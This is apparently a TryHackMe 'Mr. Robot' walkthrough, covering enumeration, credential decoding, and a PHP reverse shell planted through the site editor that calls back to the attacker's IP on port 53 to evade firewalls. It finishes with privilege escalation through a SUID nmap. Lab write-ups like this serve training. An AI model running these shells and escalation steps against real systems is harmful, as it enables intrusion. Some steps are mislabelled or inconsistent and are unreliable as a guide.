# Mr. Robot – TryHackMe Walkthrough

## 🧠 Overview
This room is based on the Mr. Robot TV series...

...

OBJECTIVE:
In this room, we are tasked with gaining root access on a vulnerable machine. 
The steps involve network enumeration, web exploitation, and privilege escalation through a reverse shell, followed by privilege escalation using GTFOBins.

INITIAL ENUMERATION:
Step 1: Network Scanning with Nmap
We start by scanning the target IP to identify open ports and services. We use the following Nmap command:
                     
                     nmap -A <target_ip>
                     
Step 2: Directory Bruteforce with Gobuster
Next, we run Gobuster to find hidden directories on the target web server:

gobuster dir -u http://<target_ip> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
This discovers directories and files that may be useful for further exploitation.
/robots
/readme
/license
/sitemap 
/login etc

step3:
http://<target_ip>/robots.txt
you will find:
User-agent: *
fsocity.dic
key-1-of-3.txt

step 4:FINDING KEY 1
to get key1 simply http://ip/key-1-of-3.txt
              OR 
curl http://ip/key-1-of-3.txt

steP5:Finding Key 2 – /license Page
http://<target_ip>/license
You’ll see a base64 encoded string, something like:
         ZGVwbG95ZXI6cm9ib3Q=
Decode It:
echo ZGVwbG95ZXI6cm9ib3Q= | base64 -d
username:password     (HINT username is elloit)


 STEP5:Web Exploitation - Reverse Shell
 after visiting http://ip/login and entering the username and passwd we just found boom we are logged in.Now we have
 to look for weak spots and luckily it wasnt too hard to find one.In the editors menu(vertical left side on website)
 when visited it shows .php so we can look for a php exploit
 

STEP6:Setting Up the Reverse Shell

We find a PHP reverse shell script on GitHub (such as this one: PHP Reverse Shell on GitHub)
and copy the code into the vulnerable web application. Here's how we set it up:

Modify the PHP script to use our IP address and the port number 53 (chosen to avoid detection or blocking by firewalls).

The PHP reverse shell typically looks like this:
                           <?php
                           $ip = '<your_ip>';   // Your IP address here
                           $port = 53;          // Port to connect back to
                           $socket = fsockopen($ip, $port);
                           exec("/bin/sh -i <&3 >&3 2>&3");
                           ?>

                           
STEP7:SETTING UP A LISTENER:
Start the Netcat listener on your local machine to accept
incoming connections on port 53 (or any port of your choice):
                          nc -lvnp 53


STEP8:BYPASSING SU AND SUDO

Once the reverse shell is successfully initiated, we are connected to the target system, but we are restricted to a limited shell. 
We cannot use sudo or su commands to elevate our privileges. This is common when running a reverse shell from a web server.

To bypass these restrictions and get a fully functional TTY shell, we can use Python to spawn a fully interactive shell. 
This method works because the reverse shell is not fully interactive at this point.

                          python -c 'import pty; pty.spawn("/bin/bash")'

pty.spawn("/bin/bash"): This spawns a new shell that supports interactive commands like clear, ls, etc., 
which aren't available in the default reverse shell.


STEP9:Finding SUID Binaries
At this point, we have basic access to the system. To escalate privileges to root, we search for SUID binaries. 
These are executables that have the setuid bit set, which means they will run with the privileges of the file owner (typically root).
We can search for these binaries by running:

                           find / -perm -4000 2>/dev/null

find /: Searches the entire filesystem.

-perm -4000: Finds files with the setuid bit set.

2>/dev/null: Suppresses error messages (like permission denied).

This search may return results like /usr/bin/nmap or /usr/bin/ssh, indicating that these binaries
are setuid and may be useful for privilege escalation.


STEP10:USING NMAP WITH SUID:
In our case, we find that Nmap is setuid, meaning it can be executed with root privileges. By using the GTFOBins resource,
we find that Nmap can be exploited for privilege escalation.
We use Nmap’s interactive mode to escalate our privileges:

                               nmap --interactive
                               
--interactive: Starts Nmap in interactive mode, where we can run system commands as the root user.

Once in interactive mode, we have root access and can run system commands like

                            whoami, id, ls /root, and more.





